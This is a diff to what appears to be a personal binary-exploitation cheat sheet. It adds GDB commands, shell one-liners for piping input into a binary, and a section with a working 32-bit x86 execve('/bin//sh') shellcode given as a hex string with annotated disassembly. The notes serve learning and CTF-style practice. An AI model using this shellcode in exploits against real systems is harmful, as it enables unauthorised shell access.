@@ -16,6 +16,7 @@
 - `pattern create 100` <- create a pattern of 100 chars
 - `pattern offset AmAA` <- show what is the offset **of** this pattern
 - `bt` <- show trace when segfault
+- `r < <(perl -e 'print "A"x5')` <- lancer le binaire, et lui envoyer un flux dans stdin
 
 > https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf
 
@@ -39,6 +40,10 @@
 to print hex values
 - `perl -e 'print "A"x12 . "aa"'`
 - `echo -ne "\x2a"`
+
+to keep stdin open
+- `(echo "hey"; cat) | ./whatever`
+- `echo "hey" > /tmp/args && cat /tmp/args - | ./whatever`
 
 ---
 ## x86 and x86_64 Assembly
@@ -295,3 +300,47 @@ Syntax
 ---
 - ` cmpl $0x0, 0x18(%esp)`
 compares the value in memory at address **%esp+0x18**
+
+---
+### shellcodes
+
+#### exec /bin/sh
+
+```asm
+echo -ne "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
+
+; execve("/bin//sh"00);
+;   ^        ^       ^  ^
+;  eax      ebx    ecx  edx
+
+6a 0b			push   $0xb			; 0xb => execve (shell-storm.org/shellcode/files/syscalls.html)
+58				pop    %eax			; pop stack value (0xb) to eax
+
+31 f6			xor    %esi,%esi
+56				push   %esi			; push '\0' to the stack
+68 2f 2f 73 68	push   $0x68732f2f	; push "hs//" to the stack
+68 2f 62 69 6e	push   $0x6e69622f	; push "hs//" to the stack
+
+89 e3			mov    %esp,%ebx	; put curnt value of stack ptr (esp) into ebx
+31 c9			xor    %ecx,%ecx	; clear/zero ecx
+89 ca			mov    %ecx,%edx	; clear/zero edx
+
+cd 80			int    $0x80		; system call execve("/bin//sh"00);
+
+; ------------------------------------------------------------------------------
+; On unix x86/x86_64 systems you can make a syscall by calling interrupt 0x80
+; Parameters are passed by setting the general purpose registers as following:
+; Syscall#	arg1  arg2  arg3  arg4  arg5  arg6
+; eax       ebx   ecx   edx   esi   edi   ebp
+
+
+; direction of growth
+; |   STACK:
+; |   ╔═════════════════╗
+; v   ║        0        ║ <-- '/0' end string ?
+;     ╠═════════════════╣
+;     ║      "hs//"     ║
+;     ╠═════════════════╣
+;     ║      "nib/"     ║ <-- ebx
+;     ╚═════════════════╝
+````
